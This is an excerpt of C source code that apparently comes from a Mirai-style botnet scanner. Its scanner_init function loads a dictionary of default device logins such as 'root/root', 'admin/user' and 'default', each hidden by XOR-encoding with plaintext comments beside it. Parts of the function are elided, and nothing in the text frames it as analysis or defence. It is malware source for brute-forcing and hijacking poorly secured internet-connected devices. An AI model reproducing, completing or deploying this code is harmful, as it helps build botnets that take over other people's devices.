...
void scanner_init(void)
{
    ...
    // Set up passwords
	add_auth_entry("\x21\x27\x31\x26", "", 4);                                				    // user
	add_auth_entry("\x30\x31\x32\x35\x21\x38\x20", "", 7);                                      // default
	add_auth_entry("\x35\x30\x39\x3D\x3A", "", 5);                                              // admin 
	add_auth_entry("\x26\x3B\x3B\x20", "", 4);                                                  // root
	add_auth_entry("\x26\x3B\x3B\x20", "\x26\x3B\x3B\x20", 8);                                  // root root
	add_auth_entry("\x26\x3B\x3B\x20", "\x21\x27\x31\x26", 8);                                  // root user
	...
	add_auth_entry("\x35\x30\x39\x3D\x3A", "\x21\x27\x31\x26", 9);                              // admin user
